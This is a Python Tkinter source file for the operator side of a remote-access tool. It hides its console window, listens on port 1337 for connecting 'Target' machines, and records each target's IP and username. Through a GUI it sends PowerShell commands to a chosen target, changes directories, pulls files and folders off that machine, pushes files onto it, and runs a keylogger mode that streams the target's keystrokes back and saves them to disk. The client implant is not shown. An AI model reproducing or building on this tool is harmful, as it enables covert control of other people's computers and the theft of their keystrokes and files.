from tkinter import NORMAL, DISABLED, Label, Entry, Button, Tk, END, Text, ttk, OptionMenu, \
    StringVar, Menu, filedialog
import ctypes
import os
import threading
from random import randint
from socket import *
from textsForTkV2 import Hebrew

killThread = threading.Event()
os.system("chcp 1255")

#  // Hide Console
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)


class Sockets(object):
    """
    MODE_MSG :: Upload/Download

    UploadFolder()   ***:<<<<<<<<<<<<:data communication CLIENT:>>>>>>>>>>>***  downloadFolder()

        SEND type Of download{folder/file}, | GET type <...,
        =>    wait for iGet                 | SEND <"GetTypeDownload">

        SEND filename, wait for iGet        | GET <..., SEND <"getFileName">

        SEND Binary in rate 100**3.9, At    | GET Binary At every beat of sixty million,
        =>   every beat of sixty million    |
        =>   wait for iGet                  | SEND  <"GetDataBinary">

        SEND if one file sending from files | GET <...,
        =>   <"R1ad0n1F">, wait for iGet    | SEND <"GetOneFile">

       END                                  | END


    UploadFolder()  ***:<<<<<<<<<<<<:data communication SERVER:>>>>>>>>>>>***  downloadFolder()

        SEND type of download{folder/file, | GET <...,
            files in Dir}, wait for iGet   | SEND <"GetTypeDownload">

        SEND fileName, wait for iGet       | GET <..., SEND <"GetFileName">

        SEND Binary {see Up}, wait for iGet| GET <..., SEND <"GetDataBinary">

        SEND <"R1ad0n1F"> , wait for iGet  | GET <..., SEND <"GetOneFile">

        END                                | END

    """

    def __init__(self):

        self.isCancelUpload = True
        xNone = os.popen("echo %username%").read().split("\n")
        self.nameAdmin = xNone[0]
        self.Server = None  # // That will be accessible from anywhere
        self.liSocket = []  # // to Send
        self.liAddress = []  # // to GRAPH and send specific client
        self.liIpPrivate = []
        self.RECV = int(100 ** 3.9)
        self.PORT = 1337
        self.ipOfClient = None  # // ip private
        self.ipChoose = None
        self.createDrop = False  # // if server.close and createdDrop  destroy else None
        self.createLabTarget = False
        self.defaultChoose = None
        self.dateFromTarget = None
        self.labTarget = None
        self.dropChooseIp = None
        self.MODE_MSG = "Command"  # //  'Download' / 'Upload' / 'ListenKeyboard' >F5< (:
        self.CLOSE = "StartRecording"
        self.file = f"Date_From_Target"
        self.languageOfKeyToListen = "EN"  # // default
        self.F_B = "fg"  # // for console {textOfResult} default: fg else: bg
        self.numToSaveFile = randint(1, 50000)
        self.TITLE = None  # // save from Terminal
        self.PathConsole = rf"c:\Users\{self.nameAdmin}"  # // default
        self.isFolderFile = None
        self.UploadRate = 45000000
        self.selectFileUpload = None  # // Upload uses for two vars [!!]
        self.selectFolderUpload = None  # // Upload
        self.isCancelDownload = True  # // default [!] any{download} run->back to default
        self.ERROR = False

    def StartServer(self):
        """
             1. server listen in 0.0.0.0 under mask=255.255.255.0 only! , or
                in 127.0.0.1 that it's selfListening {האזנה עצמית }
                server listen under func listen()-> 15 connections
                server accept connection

             2. first server get from connect ipv4 , going forward:
                in graphic configuration will be display message that
                have connections, when first connection will create
                drop in ip of the connect
            """

        self.Server = socket(AF_INET, SOCK_STREAM)
        try:
            self.Server.bind(("0.0.0.0", self.PORT))
        except OSError:
            pass

        self.Server.listen(15)
        #
        # GRAPH #
        buttActivation.config(text="Power On", fg="red",
                              command=lambda: Root.CloseServer())
        textOfResult.delete(0.0, END)
        textOfResult.insert(END, "\t\t :::[START] start listening..\n\n")
        # END #
        #
        while True:
            try:
                sockClient, address = self.Server.accept()
            except OSError:
                break  # // server.close

            # // get ipv4
            self.ipOfClient = sockClient.recv(self.RECV).decode().split("|")
            self.liIpPrivate.append({"ip": self.ipOfClient[0], "port": str(address[1]), "user": self.ipOfClient[1]})
            self.liSocket.append(sockClient)
            self.liAddress.append(address)

            #
            # GRAPH #
            textOfResult.insert(END, f"{address} name=> {self.ipOfClient[1]} :: connected\n\n")
            if len(self.liSocket) > 1:
                defaultChoose2 = self.defaultChoose.get()
                self.dropChooseIp.destroy()
                self.defaultChoose = StringVar(winRootConnect)
                self.defaultChoose.set(defaultChoose2)
                self.dropChooseIp = OptionMenu(winRootConnect, self.defaultChoose,
                                               *self.liAddress, command=lambda signal: Sockets.chooseIpTarget(self))
                # <lambda signal># take one arg
                self.dropChooseIp.place(x=0, y=140)
            elif len(self.liSocket) == 1:
                self.createDrop = True
                self.defaultChoose = StringVar(winRootConnect)
                self.defaultChoose.set("IPS")
                self.dropChooseIp = OptionMenu(winRootConnect, self.defaultChoose,
                                               *self.liAddress,
                                               command=lambda signal: Sockets.chooseIpTarget(self))  # //
                # <lambda signal># take one arg
                self.dropChooseIp.place(x=0, y=140)

            buttShowIp['state'] = NORMAL

            # END #

    # 1. clear all array containing ips, sockets. drop destroy
    #    and message label of indicating connection that selected
    #    and turn off listening of server under this func > server.close()
    def CloseServer(self):

        clientLast = ""
        try:
            clientLast = self.liSocket[-1]
        except Exception:
            pass

        for client in self.liSocket:
            try:
                client.sendall("EXIT".encode())
                client.sendall("".encode())
            except ConnectionResetError:
                self.liSocket.remove(client)

        try:
            clientLast.sendall("EXIT".encode())
            clientLast.sendall("".encode())
        except Exception:
            pass

        if self.createDrop:
            self.dropChooseIp.destroy()

        if self.createLabTarget:
            self.labTarget.place_forget()

        buttShowIp['state'] = DISABLED

        self.Server.close()
        self.liSocket.clear()
        self.liAddress.clear()

        # GRAPH #
        buttActivation.config(text="Power Off",
                              fg='black',
                              command=lambda: threading.Thread(target=Sockets.StartServer, args=(self,)).start())

        textOfResult.delete(0.0, END)
        textOfResult.insert(END, "\t\t :::[SHUTDOWN] client and server closed.")
        buttExecute['state'] = DISABLED
        # END #

    def checkWhoTarget(self):
        """
        return the connect that select from  < dropChooseIp >
        """

        for Target in self.liSocket:
            if self.ipChoose in str(Target):
                return Target

    # GRAPH > *

    # important lists of setting ['Command', 'Download', 'Upload', 'ChDir {change Dir}',  'ListenKeyboard']
    def ModeCommand(self):
        """
        define of = ['Command', 'Download', 'Upload', 'ChDir {change Dir}',  'ListenKeyboard'] => Command
        """

        buttChangeDir['state'] = NORMAL
        buttExecute['text'] = "EXECUTE"
        buttSaveDate['text'] = "Save Data"

        buttChangeMode.config(text="PowerShell",
                              command=lambda: Sockets.ModeDownload(self))

        self.MODE_MSG = "Command"

    def ModeDownload(self):
        """
            define of = [...] => Download
        """

        buttChangeDir['state'] = DISABLED
        buttExecute['text'] = "EXECUTE"
        buttSaveDate.config(text="save log Terminal", command=lambda: Sockets.saveDateFromTerminal(self))

        buttChangeMode.config(text=" Download ",
                              command=lambda: Sockets.ModeUpload(self))

        self.MODE_MSG = "Download"

    def ModeListenKeyboard(self):
        """
            define of = [...] => ListenKeyBoard
        """

        if self.liAddress and str(type(self.ipChoose)) != "<class 'NoneType'>":
            buttExecute['state'] = NORMAL

        buttChangeDir['state'] = DISABLED
        buttExecute['text'] = "OFF RECORD"
        buttSaveDate.config(text="save recording",
                            command=lambda: Sockets.saveDateFromTerminal(self))  # // TODO: function

        buttChangeMode.config(text="Listen Keyboard",
                              command=lambda: Sockets.ModeCommand(self))

        self.MODE_MSG = "ListenKeyboard"

    def ModeChDir(self):
        """
            define of =[...] => ChDir
        """
        buttChangeMode['state'] = DISABLED

        textOfResult.delete(0.0, END)

        entrCommand.delete(0, END)
        entrCommand.insert(END, "PATH>")

        self.MODE_MSG = "ChDir"

    def ModeUpload(self):
        """
            define of = [...] => Upload
        """

        buttExecute['text'] = "EXECUTE"
        buttChangeDir['state'] = DISABLED
        buttSaveDate.config(text="Save log Terminal",
                            command=lambda: Sockets.saveDateFromTerminal(self))

        buttChangeMode.config(text="Upload",
                              command=lambda: Sockets.ModeListenKeyboard(self))
        entrCommand.delete(0, END)
        entrCommand.insert(END, f"path in Target>")

        self.MODE_MSG = "Upload"

    def showListConnects(self):
        """LIST OF IPS"""

        text = """this all connects
        if you will want to send any date to specific ip
        go to "choose ip."""

        textOfResult.delete(0.0, END)
        textOfResult.insert(END, text + '\n\n')

        num = 0
        for i_p in self.liAddress:
            textOfResult.insert(END, f"{num} = {i_p}\n\n")
            num += 1

    def chooseIpTarget(self):
        """
            Defined mainly graphics configuration
        """

        self.createLabTarget = True
        self.ipChoose = self.defaultChoose.get()
        for port in self.liIpPrivate:
            if port['port'] in str(self.ipChoose):
                self.labTarget = Label(winRootConnect, text=f"ADDRESS: {port['ip']}~{port['port']}\tNAME: {port['user']}"
                                       , fg="black", font="Ariel 12")

        self.labTarget.place(x=200, y=560)
        buttExecute['state'] = NORMAL
        buttChangeDir['state'] = NORMAL

    def bgORfg(self, f_OR_b):
        """
        define foreground or background of < textOfResult >
        """
        self.F_B = f_OR_b

    def changeKeyListenHebrew(self, key):
        """
        using on dictionary of
            Key = letter of Hebrew
            Value = letter of English
        """
        if self.languageOfKeyToListen == "HE":
            for k, v in Hebrew.items():
                if v in key:
                    return k

        return key

    def menuChColor(self, color):
        """
            define fg or bg and so..
        """
        textOfResult[self.F_B] = color

    # > END  #

    def KeyHE(self):
        """
            filter the listening to Keyboard to Hebrew letters
        """
        self.languageOfKeyToListen = "HE"
        buttListenKey.config(text="Hebrew", command=lambda: Sockets.KeyEN(self))

    def KeyEN(self):
        """
            default: filter return < Key >
        """
        self.languageOfKeyToListen = "EN"
        buttListenKey.config(text="English", command=lambda: Sockets.KeyHE(self))

    def SendChDir(self):
        """
            send value of < textOfResult > = just directories of paths
            SideClient define `send` this path to CMD to define
            location of all calls {like dir || ls}
        """
        buttExecute['text'] = "RUNNING..."
        p = entrCommand.get()
        if 'c:\\' in p.lower():
            p = p[p.find("c:\\"):]
            Target = Sockets.checkWhoTarget(self)
            try:
                Target.sendall(self.MODE_MSG.encode())
                Target.sendall(p.encode())
                self.dateFromTarget = Target.recv(self.RECV).decode()
                textOfResult.insert(END, f"\n\nStatus: {self.dateFromTarget}")
                Sockets.ModeCommand(self)
                entrCommand.delete(0, END)
                buttExecute['text'] = "EXECUTE"

            except Exception:
                self.liSocket.remove(Target)
                textOfResult.delete(0.0, END)
                textOfResult.insert(END, f"\n\n{Target[1]} DISCONNECTED. can't to send")

        else:
            buttExecute['text'] = "EXECUTE"
            textOfResult.insert(END, "\n\nenter path else You're an amateur")

    def getDataCommand(self):
        """
        Returned data from JUST PowerShell
        """
        buttSaveDate['state'] = NORMAL
        buttExecute['text'] = "RUNNING.."
        if entrCommand.get() and "c:\\" not in entrCommand.get().lower()[:3]:
            Target = Sockets.checkWhoTarget(self)
            try:
                Target.sendall(self.MODE_MSG.encode())
                Target.sendall(entrCommand.get().encode())
                try:
                    self.dateFromTarget = Target.recv(self.RECV).decode()
                except UnicodeDecodeError:
                    self.dateFromTarget = "Sorry,the encoding can't read this data" \
                                          "\n\nYOU CAN change this with command chcp 437 (or another code)"
                    buttExecute['text'] = "EXECUTE"

                textOfResult.delete(0.0, END)
                if len(self.dateFromTarget) < 100000:
                    textOfResult.insert(END, f"\n\n{self.dateFromTarget}")
                else:
                    textOfResult.insert(END, 'text in this file too long -to show click Save data from '
                                             'Console-')
            except Exception as e:
                self.liSocket.remove(Target)
                textOfResult.delete(0.0, END)
                print(e)
                textOfResult.insert(END, f"\n\n{self.ipChoose} DISCONNECTED. can't to send ")

            buttExecute['text'] = "EXECUTE"
        else:
            buttExecute['text'] = "EXECUTE"

    def DownloadData(self):
        """
            see Up line 20 - 60
        """
        try:
            Target = Sockets.checkWhoTarget(self)
            if len(entrCommand.get()) > 5:

                buttExecute.config(state=DISABLED, text="RUNNING...")
                buttSaveDate['state'] = NORMAL

                textOfResult.delete(0.0, END)
                textOfResult.insert(END, f"\t\t\t[request] = ")

                Target.sendall(self.MODE_MSG.encode())
                Target.sendall(entrCommand.get().encode())
                textOfResult.insert(END, "OK!")

                # wait for data...
                self.dateFromTarget = Target.recv(self.RECV)
                if self.dateFromTarget != "ERROR".encode():
                    print("not error")
                    self.isFolderFile = self.dateFromTarget.decode().split("|")
                    Sockets.windowToDownload(self)
                    print("finish download")

                    if self.isCancelDownload:
                        Target.sendall("C!NC$L".encode())
                        textOfResult.insert(END,
                                            f"\n\n[DOWNLOAD] CANCELED PROCESSING download={self.isFolderFile[1]} Files")
                        buttExecute.config(text="EXECUTE", state=NORMAL)

                    self.isCancelDownload = True  # // important [!]
                else:
                    textOfResult.delete(0.0, END)
                    textOfResult.insert(END, self.dateFromTarget.decode())
                    buttExecute.config(state=NORMAL, text="EXECUTE")

        except OSError:
            Target = Sockets.checkWhoTarget(self)
            self.liSocket.remove(Target)
            textOfResult.delete(0.0, END)
            textOfResult.insert(END, f"\n\n{self.ipChoose} DISCONNECTED. can't to send ")
            buttExecute['state'] = NORMAL
            buttExecute['text'] = "EXECUTE"

    def getDateKeyboard(self):
        """
            Activates capability of listen to keyboard
            SideClient return Every press in keyboard
            When turn Off in SideServer HAVE TO wait
            that Side Client will click one press to Terminated processing :(
        """
        buttExecute.config(text="ON RECODER", command=lambda: Sockets.closeRecord(self))
        buttSaveDate['state'] = NORMAL
        textOfResult.delete(0.0, END)
        try:
            Target = Sockets.checkWhoTarget(self)
            try:
                while True:
                    Target.sendall(self.MODE_MSG.encode())
                    Target.sendall(self.CLOSE.encode())
                    dateFromTarget = Target.recv(100).decode()
                    if "StopRecording" in dateFromTarget:  # // important! have to object "in" on this block
                        textOfResult.insert(END, "\n\n//StopRecording")
                        self.CLOSE = "StartRecording"
                        break
                    else:
                        textOfResult.insert(END, Sockets.changeKeyListenHebrew(self, dateFromTarget))
            except Exception as s:
                print(s)
        except NameError:
            textOfResult.insert(END, "\n\nERROR : Choose IP . ")  # // ??

    # UPLOAD :start
    def FilesInDirectory(self):
        """
            performing mapping to list of folder
            JUST file
            JUST file containing data
            define Size of all Files
        """
        listFiles = []
        SizeDir = 0
        for file in os.listdir(self.selectFolderUpload):
            if os.path.getsize(file) > 0 and os.path.isfile(file):
                listFiles.append(file)
                SizeDir += os.path.getsize(file)
            else:
                # // ?
                continue

        return listFiles, SizeDir

    def UploadFile(self):
        """
            see Up line 20 - 60
        """

        fs = str(self.selectFileUpload).lower()
        Target = Sockets.checkWhoTarget(self)
        try:
            Size = os.path.getsize(fs[fs.find('c'):fs.find('>') - 1])  # error in Hebrew
        except OSError:
            Size = None
            self.ERROR = True
            Target.sendall("ERROR_HEBREW".encode())
        if Size is not None:
            Target.sendall(f"File|{Size}|{fs[fs.rfind('/') + 1:fs.find('>') - 1]}".encode())
            print(f"echo File|{Size}|{fs[fs.rfind('/') + 1:fs.find('>') - 1]}")
            Target.recv(1024)  # // iGet

            x = 0
            while True:

                if Size > x:

                    FD = self.selectFileUpload.read(self.UploadRate)
                    x += len(FD)
                    print(f"length data ={x}")
                    Target.sendall(FD)
                    textOfResult.delete(0.0, END)
                    textOfResult.insert(END, f"\n\n[UPLOAD] Uploading...{(x * 100) // Size}%")
                    Target.recv(1024)  # // iGet

                else:
                    self.selectFileUpload.close()
                    print("finish file")
                    Target.sendall('R1ad0n1F'.encode())
                    Target.recv(1024)  # // iGet
                    break
        else:
            textOfResult.delete(0.0, END)
            textOfResult.insert(END, "\tthe language of filename is Hebrew or other\n\tnow the system not supported!")

    def UploadFolder(self):
        """
            see Up line 20 - 60
        """
        xRun = 0

        Target = Sockets.checkWhoTarget(self)
        os.chdir(self.selectFolderUpload)

        files, SizeDir = Sockets.FilesInDirectory(self)  # // important [!] SizeDir not uses here
        Target.sendall(f"Folder|{len(files)}".encode())
        print(f"echo Folder|{len(files)}")
        Target.recv(1024)  # // iGet
        for file in files:
            xRun += 1
            Target.sendall(f"{file}".encode())
            Target.recv(1024)  # // iGet
            Size = os.path.getsize(file)
            file = open(file, "rb")
            print(f"read432 {file}")

            x = 0
            while True:

                if Size > x:
                    FD = file.read(self.UploadRate)
                    x += len(FD)
                    print(f"length data = {x}")
                    Target.sendall(FD)
                    textOfResult.delete(0.0, END)
                    textOfResult.insert(END, f"\n\n[UPLOAD] Uploading....{(xRun * 100) // len(files)}%")
                    Target.recv(1024).decode()  # // iGet

                else:
                    print("finish file")
                    file.close()
                    Target.sendall("R1ad0n1F".encode())
                    Target.recv(1024)  # // iGet
                    break

    def SelectFolderUp(self, win):
        """ define the select """

        self.isCancelUpload = False
        self.selectFolderUpload = "Folder"
        win.destroy()

    def SelectFileUp(self, win):
        """ define the select """

        self.isCancelUpload = False
        self.selectFileUpload = "File"
        win.destroy()

    def ChooseUpload(self):
        """
        graphic to ask Modes to Upload > file OR folder
        """
        winAsk = Tk()
        winAsk.geometry("330x150")
        winAsk.resizable(False, False)
        winAsk.title("SELECT Upload")

        labAsk = Label(winAsk, text="choose what you want to upload:", font="times 14")
        labAsk.place(x=30, y=10)
        buttFolder = ttk.Button(winAsk, text=" FOLDER ",
                                command=lambda: Sockets.SelectFolderUp(self, winAsk))
        buttFolder.place(x=30, y=50)
        buttFile = ttk.Button(winAsk, text=" FILE ",
                              command=lambda: Sockets.SelectFileUp(self, winAsk))
        buttFile.place(x=200, y=50)
        winAsk.mainloop()

    def UploadData(self):
        """
            see Up line 20 - 60
        """
        buttExecute.config(text="RUNNING...", state=DISABLED)

        if len(entrCommand.get()) > 15 and "c:\\" in entrCommand.get():
            print("=path ok=")
            Target = Sockets.checkWhoTarget(self)

            Sockets.ChooseUpload(self)
            print("selected")

            if not self.isCancelUpload:
                Target.sendall(self.MODE_MSG.encode())
                Target.sendall(entrCommand.get()[entrCommand.get().find("c:\\"):].encode())

                self.dateFromTarget = Target.recv(self.RECV)
                if not "ERROR".encode() in self.dateFromTarget:

                    if self.selectFileUpload:

                        self.selectFileUpload = filedialog.askopenfile("rb")
                        if self.selectFileUpload:
                            print("selected file")
                            Sockets.UploadFile(self)
                            print("finish uploading file")

                            if not self.ERROR:
                                print("terminate")
                                f = str(self.selectFileUpload)
                                textOfResult.insert(END,
                                                    f"\n\n\tUploading File={f[f.rfind('/')+1:f.find('>') - 1]} successfully.")
                                buttExecute.config(text="EXECUTE", state=NORMAL)

                            self.selectFileUpload = None
                            self.ERROR = False
                            buttExecute.config(text="EXECUTE", state=NORMAL)
                        else:
                            Target.sendall("C!NC$L".encode())
                            textOfResult.insert(END, "\n\n[UPLOAD] process UPLOAD canceled.")
                            buttExecute.config(text="EXECUTE", state=NORMAL)

                    if self.selectFolderUpload:

                        self.selectFolderUpload = filedialog.askdirectory()
                        if self.selectFolderUpload:
                            print("selected folder")
                            Sockets.UploadFolder(self)
                            print("finish upload folder")
                            print("terminate")
                            textOfResult.insert(END, f"\n\nUploading Folder={self.selectFolderUpload} successfully.")
                            buttExecute.config(text="EXECUTE", state=NORMAL)
                            self.selectFolderUpload = None
                        else:
                            Target.sendall("C!NC$L".encode())
                            textOfResult.insert(END, "\n\n[UPLOAD] process UPLOAD canceled.")
                            buttExecute.config(text="EXECUTE", state=NORMAL)

                else:
                    textOfResult.insert(END, f"\n\n{self.dateFromTarget.decode()} path of Windows directory not exist")
                    buttExecute.config(text="EXECUTE", state=NORMAL)

            else:
                textOfResult.insert(END, "\n\n[UPLOAD] Choose UPLOAD canceled.")
                buttExecute.config(text="EXECUTE", state=NORMAL)
        else:
            textOfResult.insert(END, f"\n\nEnter path to download this in target")
            buttExecute.config(text="EXECUTE", state=NORMAL)

    # UPLOAD :end

    def closeRecord(self):
        self.CLOSE = "StopRecording"
        textOfResult.insert(END, f"\n\nWait for lest press from target...")
        buttExecute.config(text="OFF RECORD",
                           command=lambda: Sockets.choiceModeRun(self))

    # //  Modes [!]
    def choiceModeRun(self):
        """
            When Clicked in < EXEcUTE >  this module run
            Running - BY - settings that defined [see < MODE_MSG > ]
        """
        if self.MODE_MSG == "Download":
            Sockets.DownloadData(self)
        elif self.MODE_MSG == "Command":
            Sockets.getDataCommand(self)
        elif self.MODE_MSG == "ListenKeyboard":
            threading.Thread(target=Sockets.getDateKeyboard, args=(self,)).start()

        elif self.MODE_MSG == "ChDir":
            buttChangeMode['state'] = NORMAL
            Sockets.SendChDir(self)

        elif self.MODE_MSG == "Upload":
            Sockets.UploadData(self)

    def saveDateFromTerminal(self):
        """
            save data of console
            like  when the listen keyboard running  { the presses print to console }
        """
        for ipPrivate in self.liIpPrivate:
            if str(ipPrivate['port']) in self.ipChoose:
                self.TITLE = f"{'=' * 28}\n**from Target {ipPrivate['ip']}\n{'=' * 28}\n\n\n"

        if textOfResult.get(0.0, END):

            xNone = randint(1, 432452)
            path = rf"c:\Users\{self.nameAdmin}\Desktop\{self.file}{xNone}.txt"
            with open(path, "w", encoding="utf-8") as f:
                f.write(self.TITLE)
                f.write(textOfResult.get(0.0, END))

            textOfResult.insert(0.0, f"[DOWNLOAD] success! file in {path}\n\n")

        else:
            pass

    # DOWNLOADS :start
    def windowToDownload(self):
        """
            ... {see < Download[File,Folder] >}
        """

        slash = "\\"
        p = entrCommand.get()
        PathDownload = rf"c:\Users\{self.nameAdmin}\Desktop\{p[p.rfind(slash) + 1:]}"
        windowDate = Tk()
        windowDate.geometry("500x200")
        windowDate.title(" Downloading")

        labPath = Label(windowDate, text=f"Your Path of {self.isFolderFile[0]}:", font="times 14")
        labPath.place(x=110, y=10)

        labLenFiles = Label(windowDate, text=f"Files : {self.isFolderFile[1]}", font="times 13")
        labLenFiles.place(x=0, y=90)

        entryPath = Entry(windowDate, width=50, font="times 16", fg="green")
        entryPath.place(x=0, y=40)

        entryPath.insert(0, PathDownload)

        buttSAVE = ttk.Button(windowDate, text="SAVE",
                              command=lambda: Sockets.SAVE(self, entryPath.get(), windowDate))
        buttSAVE.place(x=420, y=140)
        buttCancel = ttk.Button(windowDate, text="Cancel", command=lambda: windowDate.destroy())
        buttCancel.place(x=330, y=140)
        windowDate.mainloop()

    def downloadFolder(self, path):
        """
            see Up line 20 - 60
        """
        try:
            Target = Sockets.checkWhoTarget(self)

            self.numToSaveFile = randint(1, 4245)
            if not os.path.isdir(path):
                os.mkdir(path)
            else:
                path = path + f"{self.numToSaveFile}"
                os.mkdir(path)

            Target.sendall("GetTypeDownload".encode())
            for xRun in range(int(self.isFolderFile[1])):  # // this fucking just number !

                Nf = Target.recv(self.RECV).decode()  # // name file
                with open(f"{path}\\{Nf}", "ab") as f:

                    Target.sendall("getFileName".encode())

                    while True:

                        self.dateFromTarget = Target.recv(self.RECV)

                        if not "R1ad0n1F".encode() in self.dateFromTarget:  # // "R1ad0n1F" can't be exist in data!
                            textOfResult.delete(0.0, END)
                            textOfResult.insert(END,
                                                f"\n\n[DOWNLOAD]"
                                                f" downloading....{(xRun * 100) // int(self.isFolderFile[1])} %")
                            f.write(self.dateFromTarget)

                            Target.sendall("GetDataBinary".encode())

                        else:
                            Target.sendall("GetOneFile".encode())
                            break

        except ConnectionResetError:
            Target = Sockets.checkWhoTarget(self)
            self.liSocket.remove(Target)
            textOfResult.delete(0.0, END)
            textOfResult.insert(END, f"\n\n{self.ipChoose} DISCONNECTED. can't to send ")
            buttExecute.config(state=NORMAL, text="EXECUTE")

    def downloadFile(self, path):
        """
        see Up line 20 - 60
        """
        try:
            Target = Sockets.checkWhoTarget(self)

            F = open(path, "ab")
            Target.sendall("GetTypeDownload".encode())
            print("ok")
            x = 0
            while True:

                self.dateFromTarget = Target.recv(self.RECV)
                if "R1ad0n1F".encode() not in self.dateFromTarget:
                    textOfResult.delete(0.0, END)
                    textOfResult.insert(END,
                                        f"\n\n[DOWNLOAD] downloading....{int((x * 100) / int(self.isFolderFile[2]))} %")
                    F.write(self.dateFromTarget)
                    x = + len(self.dateFromTarget)
                    print(f"length data={x}")
                    Target.sendall("GetDataBinary".encode())

                else:
                    F.close()
                    print("finish file")
                    Target.sendall("GetOneFile".encode())
                    break

        except ConnectionResetError:
            Target = Sockets.checkWhoTarget(self)
            self.liSocket.remove(Target)
            textOfResult.delete(0.0, END)
            textOfResult.insert(END, f"\n\n{self.ipChoose} DISCONNECTED. can't to send ")
            buttExecute.config(text="EXECUTE", state=NORMAL)

    def SAVE(self, path, window):
        """
        main process of Downloads
        """
        try:
            self.isCancelDownload = False
            if path:
                if "Folder" in self.isFolderFile:
                    window.destroy()
                    Sockets.downloadFolder(self, path)

                    textOfResult.insert(END, f"\n\ndownload folder successfully.")

                    buttExecute.config(text="EXECUTE", state=NORMAL)

                elif "File" in self.isFolderFile:
                    window.destroy()
                    Sockets.downloadFile(self, path)
                    print("finish down..")

                    textOfResult.insert(END, f"\n\ndownload file successfully.")
                    buttExecute.config(text="EXECUTE", state=NORMAL)

            else:
                textOfResult.insert(END, f"\n\nENTER path of system windows !")

        except Exception:
            pass

    # DOWNLOADS :end

# // All graphics


Root = Sockets()

winRootConnect = Tk()
winRootConnect.geometry("800x620")
winRootConnect.title("CONNECT to other devices")

# menu
menuOfConnect = Menu(winRootConnect)
menuSystem = Menu(menuOfConnect, activeborderwidth=5)
menuColor = Menu(menuOfConnect, activeborderwidth=5)
menuOfConnect.add_cascade(label="system", menu=menuSystem)
menuOfConnect.add_cascade(label="colorOfConsole", menu=menuColor)
# // menu System
menuSystem.add_command(label="kill process", command=lambda: os.system(f"taskkill /pid {os.getpid()} /f"))

# // menu color
menuColor.add_command(label="bg", command=lambda: Root.bgORfg("bg"))
menuColor.add_command(label="fg", command=lambda: Root.bgORfg("fg"))
menuColor.add_separator()

menuColor.add_command(label="red", command=lambda: Root.menuChColor("red"))
menuColor.add_command(label="green", command=lambda: Root.menuChColor("green"))
menuColor.add_command(label="black", command=lambda: Root.menuChColor("black"))
menuColor.add_command(label="blue", command=lambda: Root.menuChColor("blue"))
menuColor.add_command(label="gray", command=lambda: Root.menuChColor("gray"))
menuColor.add_command(label="brown", command=lambda: Root.menuChColor("brown"))
menuColor.add_command(label="white", command=lambda: Root.menuChColor("white"))

# Entry's
entrCommand = Entry(winRootConnect, width=40, font=2, bd=3, fg="red")
entrCommand.place(x=195, y=30)

# Buttons
buttActivation = Button(winRootConnect, text="power Off", font="times",
                        command=lambda: threading.Thread(target=Root.StartServer).start())
buttActivation.place(x=20, y=23)
buttExecute = ttk.Button(winRootConnect, text="EXECUTE", state=DISABLED,
                         command=lambda: threading.Thread(target=Root.choiceModeRun).start())
buttExecute.place(x=660, y=30)
buttShowIp = Button(winRootConnect, text="open", bg='black', fg="white", state=DISABLED,
                    command=Root.showListConnects)
buttShowIp.place(x=70, y=80)
buttSaveDate = ttk.Button(winRootConnect, text="Save Data", state=DISABLED,
                          command=Root.saveDateFromTerminal)
buttSaveDate.place(x=680, y=560)
buttChangeMode = ttk.Button(winRootConnect, text="PowerShell", command=Root.ModeDownload)
buttChangeMode.place(x=0, y=230)
buttChangeDir = ttk.Button(winRootConnect, text="change dir", stat=DISABLED, command=Root.ModeChDir)
buttChangeDir.place(x=0, y=290)
buttListenKey = ttk.Button(winRootConnect, text="English", command=Root.KeyHE)
buttListenKey.place(x=0, y=350)

# labels
labShowIp = Label(winRootConnect, text="::::: IP:", font="Helvetica 14")
labShowIp.place(x=0, y=80)
labChooseIp = Label(winRootConnect, text="CHOOSE IP:", font="Helvetica 13")
labChooseIp.place(x=0, y=120)
labModeMSG = Label(winRootConnect, text="MODE MSG", font="Helvetica 13")
labModeMSG.place(x=0, y=200)
labOption = Label(winRootConnect, text="change dir:", font="Helvetica 12")
labOption.place(x=0, y=260)
labListenKey = ttk.Label(winRootConnect, text="listen to Keyboard:", font="Helvetica 12")
labListenKey.place(x=0, y=320)

# Text > 0
textOfResult = Text(winRootConnect, width=65, height=25, bd=3, font="Arial 12 bold")
textOfResult.place(x=190, y=70)

# Menu
winRootConnect.config(menu=menuOfConnect)
winRootConnect.mainloop()

# [+]  Project created By: Avraham sabann
# [+]  START: 12/1/2021
# [+]  END: 27/3/2021
# [+]  youtube: https://www.youtube.com/channel/UCmjNqTy_Qg-Ns0jT9atWr7g
# [+]  Git: https://github.com/albertPPower
# [+]  IMPORTS: tkinter; os; threading; random; socket;
# [+]  Self-library: textsForTkV2;
# [+]  THANKS : mySelf and to YOU (●'◡'●)

